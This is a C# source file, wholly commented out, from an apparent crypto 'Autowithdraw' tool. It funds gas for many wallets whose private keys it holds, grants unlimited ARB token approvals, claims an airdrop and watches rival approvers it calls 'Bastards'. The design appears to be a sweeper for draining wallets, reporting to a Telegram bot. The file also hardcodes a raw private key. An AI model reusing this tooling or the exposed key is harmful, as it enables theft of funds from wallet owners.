using Autowithdraw.Global;
using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using NBitcoin.Scripting;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.Client;
using Nethereum.Model;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Util;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Numerics;
using System.Security.Claims;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using Account = Nethereum.Web3.Accounts.Account;

namespace Autowithdraw.Main.Actions
{
    class Arb
    {
        /*private static int ChainID = 42161;
        private static Web3 Web = new Web3($"https://arbitrum.blockpi.network/v1/rpc/public");
        private static BigInteger GasPrice = Web3.Convert.ToWei(0.11, UnitConversion.EthUnit.Gwei);
        private static BigInteger Gas = 650000;

        public static IClient HTTPClient =
            new RpcClient(new Uri($"https://arbitrum.blockpi.network/v1/rpc/public"),
                new HttpClient(new HttpClientHandler()));

        public static async Task Starter(string PrivateKey, string[] Addresses, string ApproveAddress, bool isApprove = true)
        {
            #region Values

            List<Task> Threads = new List<Task>();
            long beginTiks = DateTime.Now.Ticks;
            GasPrice = await Web.Eth.GasPrice.SendRequestAsync() + Web3.Convert.ToWei(0.1, UnitConversion.EthUnit.Gwei);

            BigInteger Spent = 0;
            string txHashes = "TXs:\n\n";
            string Link = Settings.Chains[ChainID].Link;

            int Success = 0;
            int Running = 0;

            #endregion

            foreach (string RawAddress in Addresses)
            {
                string Address = Web3.ToChecksumAddress(RawAddress);

                while (Running > 10)
                    Thread.Sleep(30);

                async Task Claim()
                {
                    try
                    {
                        Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID), Settings.Chains[ChainID].HTTPClient);

                        var Contract = new ContractHelper(Address, "0x912CE59144191C1204E64559FE8253a0e49E6548", Account);
                        BigInteger Allowance = await Contract.Allowance(Address, ApproveAddress);

                        if (isApprove && Allowance > Settings.MaxInt - 100000000000000000)
                            throw new Exception("Already approved");

                        if (!isApprove && Allowance < BigInteger.Parse("10000000000000000000"))
                            throw new Exception("Already revoked");

                        Function Approve = Contract.Get("approve");

                        var Input = new TransactionInput
                        {
                            From = Address,
                            To = "0x912CE59144191C1204E64559FE8253a0e49E6548",
                            Gas = new HexBigInteger(Gas),
                            GasPrice = new HexBigInteger(GasPrice),
                            Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address,
                                BlockParameter.BlockParameterType.latest)
                        };

                        new Thread(async () =>
                        {
                            BigInteger Wei = Gas * GasPrice;
                            await TransferGas(PrivateKey, Address, Wei);
                            Spent += Wei + (650000 * GasPrice);
                        }).Start();

                        for (int i = 0; i < 50; i++)
                        {
                            try
                            {
                                string txHash = await Approve.SendTransactionAsync(Input, ApproveAddress, isApprove ? Settings.MaxInt : 1000000000000000000);

                                txHashes += $"<a href=\"https://{Link}/tx/{txHash}\">{txHash}</a>\n";
                                Success++;
                                break;
                            }
                            catch (Exception e)
                            {
                                if (e.Message.Contains("insufficient funds"))
                                    continue;
                                if (e.Message.Contains("nonce too low"))
                                    break;
                                Console.WriteLine(e.Message);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        if (e.Message.Contains("Already"))
                        {
                            Success++;
                        }
                    }

                    //Console.WriteLine(txHash + $" {Address}");
                    Running--;
                }

                Running++;

                Threads.Add(Claim());
            }

            await Task.WhenAll(Threads);

            float Amount = Pricing.GetPrice(Spent, ChainID);
            await Settings.TXSpy.Bot.SendTextMessageAsync(-4094775814, $"Successful: {Success}/{Addresses.Length}\nSpent: {Amount}$\nTime passed: {(int)new TimeSpan(DateTime.Now.Ticks - beginTiks).TotalSeconds} secs", ParseMode.Html);
        }

        public static async Task<string> TransferGas(
            string PrivateKey,
            string Address,
            BigInteger Wei)
        {
            string txHash = "";

            Account Key = new Account(PrivateKey, ChainID);

            Web3 Account = new Web3(Key,
                HTTPClient);

            TransactionInput TX = new TransactionInput
            {
                From = Key.Address,
                Gas = new HexBigInteger(650000),
                GasPrice = new HexBigInteger(GasPrice),
                Value = new HexBigInteger(Wei),
                Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Key.Address, BlockParameter.BlockParameterType.latest),
                To = Address
            };

            for (int i = 0; i < 15; i++)
            {
                try
                {
                    txHash = await Account.TransactionManager.SendTransactionAsync(TX);
                    break;
                }
                catch (Exception e)
                {
                    //Console.WriteLine(e.Message + " asfasf");
                    if (e.Message.Contains("nonce too low"))
                        TX.Nonce = new HexBigInteger(TX.Nonce.Value + 1);
                    if (e.Message.Contains("insufficient"))
                        await Network.SendTelegram($"Sponsor in {Settings.Chains[ChainID].Name} not have funds - {Settings.Chains[ChainID].Contract.Sponsor}");
                }
            }
            return txHash;
        }

        public static async Task Claim()
        {
            Logger.Debug("Claiming arb");
            string[] RawAddresses = await File.ReadAllLinesAsync("our.txt");
            List<string> ApprovedAddresses = new List<string>();

            var ContractARB = new ContractHelper("", "0x912CE59144191C1204E64559FE8253a0e49E6548", Web);

            foreach (string RawAddress in RawAddresses)
            {
                string Address = Web3.ToChecksumAddress(RawAddress);

                BigInteger Allowance = await ContractARB.Allowance(Address, Settings.Config.Proxy.Address);

                if (Allowance >= BigInteger.Parse("70000000000000000000"))
                {
                    ApprovedAddresses.Add(Address);
                }
            }

            await Claim("0x22847c3ea199c770faafbed36f9773c66e37aa6a1067c762d1d85fe87138ee4d", ApprovedAddresses.ToArray());
        }

        private static async Task Claim(string PrivateKey, string[] Addresses)
        {
            #region Values

            List<Task> Threads = new List<Task>();
            GasPrice = await Web.Eth.GasPrice.SendRequestAsync() + Web3.Convert.ToWei(0.1, UnitConversion.EthUnit.Gwei);

            int Running = 0;

            #endregion

            foreach (string Address in Addresses)
            {
                while (Running > 5)
                    Thread.Sleep(30);

                async Task Claim()
                {
                    try
                    {
                        Web3 Account = new Web3(new Account(Settings.Wallets[Address], ChainID), HTTPClient);

                        var Input = new TransactionInput
                        {
                            From = Address,
                            To = "0x67a24CE4321aB3aF51c2D0a4801c3E111D88C9d9",
                            Gas = new HexBigInteger(Gas),
                            GasPrice = new HexBigInteger(GasPrice),
                            Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Address,
                                BlockParameter.BlockParameterType.latest),
                            Data = "0x4e71d92d"
                        };

                        new Thread(async () =>
                        {
                            BigInteger Wei = Gas * GasPrice;
                            await TransferGas(PrivateKey, Address, Wei);
                        }).Start();

                        for (int i = 0; i < 50; i++)
                        {
                            try
                            {
                                await Account.Eth.TransactionManager.SendTransactionAsync(Input);
                                break;
                            }
                            catch (Exception e)
                            {
                                if (e.Message.Contains("insufficient funds"))
                                    continue;
                                if (e.Message.Contains("nonce too low"))
                                    break;
                                Console.WriteLine(e.Message);
                            }
                        }
                    }
                    catch
                    {
                    }

                    //Console.WriteLine(txHash + $" {Address}");
                    Running--;
                }

                Running++;

                Threads.Add(Claim());
            }
        }

        public static async Task<Dictionary<string, List<string>>> GetApproves(string[] RawAddresses, bool isApprove = false)
        {
            var Approved = new Dictionary<string, List<string>>();
            var Contract = new ContractHelper("", "0x912CE59144191C1204E64559FE8253a0e49E6548", Web);
            List<Task> Threads = new List<Task>();

            string[] Bastards = Settings.Config.Other.Bastards.ToArray();

            foreach (string Bastard in Bastards)
            {
                Approved.Add(Web3.ToChecksumAddress(Bastard), new List<string>());
            }

            async Task Check(string[] Addresses)
            {
                foreach (string RawAddress in Addresses)
                {
                    string Address = Web3.ToChecksumAddress(RawAddress);

                    foreach (string RawApprovedAddress in Bastards)
                    {
                        try
                        {
                            string ApprovedAddress = Web3.ToChecksumAddress(RawApprovedAddress);

                            if (isApprove)
                                if (ApprovedAddress != Settings.Config.Proxy.Address)
                                    continue;

                            BigInteger Allowance = await Contract.Allowance(Address, ApprovedAddress);

                            if (Allowance > 11000000000000000000)
                            {
                                //if (Approved["0x59D4087F3FF91DA6a492b596cbDe7140C34afB19"].Count > 200)
                                //    break;
                                //Console.WriteLine($"Founded {ApprovedAddress}");
                                Approved[ApprovedAddress].Add(Address);
                            }
                        }
                        catch (Exception e)
                        {
                            //Logger.Error(e);
                        }
                    }
                }
            }

            foreach (string[] Addresses in Helper.Chunk(RawAddresses, 10))
            {
                Threads.Add(Check(Addresses));
            }

            await Task.WhenAll(Threads);

            return Approved;
        }*/
    }
}
